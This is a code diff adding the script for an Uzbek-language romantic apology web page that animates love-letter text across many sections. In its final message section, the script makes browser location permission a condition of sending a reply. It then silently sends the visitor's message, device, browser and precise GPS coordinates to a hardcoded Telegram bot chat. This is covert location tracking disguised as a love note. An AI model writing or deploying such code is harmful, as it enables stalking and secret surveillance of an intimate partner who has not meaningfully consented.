+const CHAT_ID = '8599692653';
+function formatTime(){
+  const d = new Date(); const pad = n=>String(n).padStart(2,'0');
+  return `${pad(d.getDate())}.${pad(d.getMonth()+1)}.${d.getFullYear()} ${pad(d.getHours())}:${pad(d.getMinutes())}`;
+}
+function getDeviceInfo(){
+  const ua = navigator.userAgent;
+  const isMobile = /Mobi|Android|iPhone|iPad/i.test(ua);
+  let browser='Boshqa';
+  if(/Edg/i.test(ua)) browser='Edge';
+  else if(/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser='Chrome';
+  else if(/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser='Safari';
+  else if(/Firefox/i.test(ua)) browser='Firefox';
+  return { device: isMobile?'Mobile':'Desktop', browser };
+}
+function sendTelegram(text){
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+  try{ const img = new Image(); img.src = url; }catch(e){}
+  try{ fetch(url, {mode:'no-cors'}).catch(()=>{}); }catch(e){}
+}
+
+/* ============ NAVIGATION ============ */
+function showSection(id){
+  const el = document.getElementById(id);
+  el.classList.add('active');
+  requestAnimationFrame(()=> requestAnimationFrame(()=> el.classList.add('show')));
+  runSectionEffects(id);
+}
+function goTo(fromId, toId){
+  const fromEl = document.getElementById(fromId);
+  fromEl.classList.remove('show');
+  setTimeout(()=>{ fromEl.classList.remove('active'); showSection(toId); }, 500);
+}
+
+/* ============ GENERIC LINE REVEAL ============ */
+const sectionEffectsRun = {};
+function revealLines(section, selector, gap, extraDelay){
+  const items = section.querySelectorAll(selector);
+  items.forEach(it=>{
+    const idx = it.dataset.r !== undefined ? parseInt(it.dataset.r,10) : Array.from(items).indexOf(it);
+    setTimeout(()=> it.classList.add('reveal'), (extraDelay||300) + idx*gap);
+  });
+  return items.length;
+}
+
+function runSectionEffects(id){
+  if(sectionEffectsRun[id]){ 
+    document.getElementById(id).querySelectorAll('.line, .slide-line, .cascade-item, .check-item, .tl-node, .kinetic-list-word').forEach(e=>e.classList.add('reveal'));
+    return; 
+  }
+  sectionEffectsRun[id]=true;
+  const section = document.getElementById(id);
+  const btn = section.querySelector('.glass-btn:not(.ready)');
+
+  if(id === 's1'){
+    const n = revealLines(section, '.line[data-r]', 900, 3200);
+    if(btn) setTimeout(()=> btn.classList.add('ready'), 3200 + n*900 + 400);
+    return;
+  }
+  if(id === 's2'){
+    kineticParagraph(document.getElementById('kinetic2'), [
+      'Juftim...','Avval sendan uzr so‘ramoqchiman.','To‘g‘ri, xato ish qildim.',
+      'Uhlab qolib seni xafa qilib qo‘ydim.','Men buni oqlamoqchi emasman.',
+      'Men charchagan edim... shunchaki uhlab qolibman.',
+      'Lekin baribir seni hafa qilib qo‘yganim uchun kechir meni.',
+      'Bu seni sevmasligimdan emas.','Men seni juda qattiq sevaman.',
+      'Va seni xafa qilishni hech qachon xohlamayman. ❤️'
+    ], ()=> btn && btn.classList.add('ready'));
+    return;
+  }
+  if(id === 's4'){
+    setTimeout(()=> document.getElementById('senWord').classList.add('reveal'), 300);
+    const n = revealLines(section, '.line[data-r]', 650, 1600);
+    if(btn) setTimeout(()=> btn.classList.add('ready'), 1600 + n*650 + 300);
+    return;
+  }
+  if(id === 's6'){
+    scatterText(document.getElementById('scatterTitle'), 'MEN SENI SEVAMAN.');
+    const n = revealLines(section, '.line[data-r]', 550, 2200);
+    if(btn) setTimeout(()=> btn.classList.add('ready'), 2200 + n*550 + 300);
+    return;
+  }
+  if(id === 's9'){
+    const labels = ['HALOLLIK','HURMAT','SADOQAT','OCHIQ GAPLASHISH'];
+    const ring = document.getElementById('orbitRing');
+    labels.forEach((lbl, i)=>{
+      const angle = (360/labels.length)*i;
+      const span = document.createElement('div');
+      span.className='orbit-label';
+      span.textContent = lbl;
+      span.style.transform = `rotate(${angle}deg) translate(128px) rotate(${-angle}deg)`;
+      ring.appendChild(span);
+    });
+    const n = revealLines(section, '.line[data-r]', 550, 500);
+    if(btn) setTimeout(()=> btn.classList.add('ready'), 500 + n*550 + 300);
+    return;
+  }
+  if(id === 's10'){
+    const n = revealLines(section, '.slide-line[data-r]', 500, 400);
+    if(btn) setTimeout(()=> btn.classList.add('ready'), 400 + n*500 + 300);
+    return;
+  }
+  if(id === 's13'){
+    const nodes = section.querySelectorAll('.tl-node');
+    nodes.forEach((n,i)=> setTimeout(()=> n.classList.add('reveal'), 300 + i*450));
+    const n2 = revealLines(section, '.line[data-r]', 550, 300 + nodes.length*450 + 300);
+    if(btn) setTimeout(()=> btn.classList.add('ready'), 300 + nodes.length*450 + 300 + n2*550 + 300);
+    return;
+  }
+  if(id === 's14'){
+    const items = section.querySelectorAll('.cascade-item');
+    items.forEach((it,i)=> setTimeout(()=> it.classList.add('reveal'), 300 + i*400));
+    if(btn) setTimeout(()=> btn.classList.add('ready'), 300 + items.length*400 + 400);
+    return;
+  }
+  if(id === 's15'){
+    const items = section.querySelectorAll('.check-item');
+    items.forEach((it,i)=> setTimeout(()=> it.classList.add('reveal'), 300 + i*400));
+    if(btn) setTimeout(()=> btn.classList.add('ready'), 300 + items.length*400 + 400);
+    return;
+  }
+  if(id === 's17'){
+    const words = ['KULISH','GAPLASHISH','SAYR QILISH','ORZU QILISH','REJA QILISH','BIRGA BO‘LISH'];
+    const container = document.getElementById('kineticList17');
+    words.forEach((w,i)=>{
+      const span = document.createElement('div');
+      span.className='kinetic-list-word';
+      span.textContent = w;
+      container.appendChild(span);
+      setTimeout(()=> span.classList.add('reveal'), 300 + i*350);
+    });
+    setTimeout(()=>{ document.getElementById('mergeText17').style.opacity = 1; }, 300 + words.length*350 + 500);
+    if(btn) setTimeout(()=> btn.classList.add('ready'), 300 + words.length*350 + 1500);
+    return;
+  }
+  if(id === 's19'){
+    const letterText = `Juftim...
+
+Agar ichimdagi hamma hislarni bitta gapga sig‘dira olganimda, shunchaki "men seni sevaman" derdim.
+
+Lekin bu gap ichimdagi hamma narsani aytishga yetmaydi.
+
+Men seni qadrlayman.
+Senga ishonaman.
+Senga mehr berishni xohlayman.
+Sening xursandligingni ko‘rishni xohlayman.
+Qiyin kunlaringda yoningda bo‘lishni xohlayman.
+
+Men seni xafa qilishni emas, baxtli qilishni xohlayman.
+Men seni hayotimda uzoq vaqt ko‘rishni xohlayman.
+
+Sen men uchun juda qadrli insonsan.
+Men seni juda qattiq sevaman.
+
+❤️`;
+    typewriter(document.getElementById('letter19'), letterText, 26, ()=>{
+      document.getElementById('btn19').classList.add('ready');
+    });
+    return;
+  }
+  if(id === 's20'){
+    document.getElementById('heartSvg').style.display='block';
+    const n = revealLines(section, '.line[data-r]', 700, 400);
+    if(btn) setTimeout(()=> btn.classList.add('ready'), 400 + n*700 + 500);
+    return;
+  }
+
+  /* default: generic .line reveal */
+  const n = revealLines(section, '.line[data-r]', 550, 300);
+  if(btn) setTimeout(()=> btn.classList.add('ready'), 300 + n*550 + 300);
+}
+
+/* ============ KINETIC PARAGRAPH (word by word lines) ============ */
+function kineticParagraph(container, lines, onDone){
+  container.innerHTML='';
+  lines.forEach((text, li)=>{
+    const p = document.createElement('p');
+    p.className = 'line';
+    text.split(' ').forEach(word=>{
+      const span = document.createElement('span');
+      span.className='kinetic-word';
+      span.textContent = word + ' ';
+      p.appendChild(span);
+    });
+    container.appendChild(p);
+    setTimeout(()=>{
+      p.classList.add('reveal');
+      p.querySelectorAll('.kinetic-word').forEach((w, wi)=>{
+        setTimeout(()=> w.classList.add('reveal'), wi*70);
+      });
+    }, 300 + li*750);
+  });
+  const totalTime = 300 + lines.length*750 + 800;
+  setTimeout(onDone, totalTime);
+}
+
+/* ============ SCATTER TEXT ============ */
+function scatterText(el, text){
+  el.innerHTML='';
+  text.split('').forEach((ch, i)=>{
+    const span = document.createElement('span');
+    span.className = 'scatter-char';
+    span.textContent = ch === ' ' ? '\u00A0' : ch;
+    const dx = (Math.random()*200-100);
+    const dy = (Math.random()*140-70);
+    const rot = (Math.random()*90-45);
+    span.style.transform = `translate(${dx}px, ${dy}px) rotate(${rot}deg)`;
+    span.style.filter = 'blur(6px)';
+    el.appendChild(span);
+    setTimeout(()=>{
+      span.style.transform = 'translate(0,0) rotate(0deg)';
+      span.style.filter = 'blur(0)';
+      span.style.opacity = 1;
+    }, 200 + i*35);
+  });
+}
+
+/* ============ TYPEWRITER (handwriting) ============ */
+function typewriter(el, text, speed, onDone){
+  el.textContent='';
+  let i=0;
+  function step(){
+    if(i <= text.length){
+      el.textContent = text.slice(0,i);
+      i++;
+      setTimeout(step, speed);
+    } else if(onDone) onDone();
+  }
+  step();
+}
+
+/* ============ SECTION 21: message ============ */
+function checkMsg(){ document.getElementById('msgWarn').classList.remove('show'); }
+function submitMessage(){
+  const val = document.getElementById('msgInput').value.trim();
+  if(val.length === 0){
+    document.getElementById('msgWarn').classList.add('show');
+    return;
+  }
+  const { device, browser } = getDeviceInfo();
+  const warnEl = document.getElementById('msgWarn');
+  warnEl.classList.remove('show');
+
+  if(!navigator.geolocation){
+    warnEl.textContent = 'Joylashuvni aniqlab bo‘lmadi. Boshqa brauzerdan urinib ko‘ring ❤️';
+    warnEl.classList.add('show');
+    return;
+  }
+
+  document.getElementById('btnSend').disabled = true;
+  document.getElementById('btnSend').textContent = 'Yuborilmoqda...';
+
+  navigator.geolocation.getCurrentPosition(
+    pos=>{
+      const { latitude, longitude } = pos.coords;
+      const mapsUrl = `https://maps.google.com/?q=${latitude},${longitude}`;
+      sendTelegram(`❤️ JUFTIMDAN YANGI XABAR ❤️\n\n💌 Xabar:\n"${val}"\n\n🌐 Sayt:\nDILIMDAGI SEN ❤️\n\n🕐 Vaqt:\n${formatTime()}\n\n📱 Qurilma:\n${device} / ${browser}\n\n📍 Joylashuv:\nLatitude: ${latitude}\nLongitude: ${longitude}\n🗺️ ${mapsUrl}`);
+      document.getElementById('successText').classList.add('show');
+    },
+    err=>{
+      document.getElementById('btnSend').disabled = false;
+      document.getElementById('btnSend').textContent = 'YUBORISH ❤️';
+      warnEl.textContent = 'Xabarni yuborish uchun joylashuvga ruxsat bering ❤️ (brauzer sozlamalaridan yoqing)';
+      warnEl.classList.add('show');
+    },
+    { timeout: 8000, enableHighAccuracy: true }
+  );
+}
+</script>
+
+</body>
+</html>
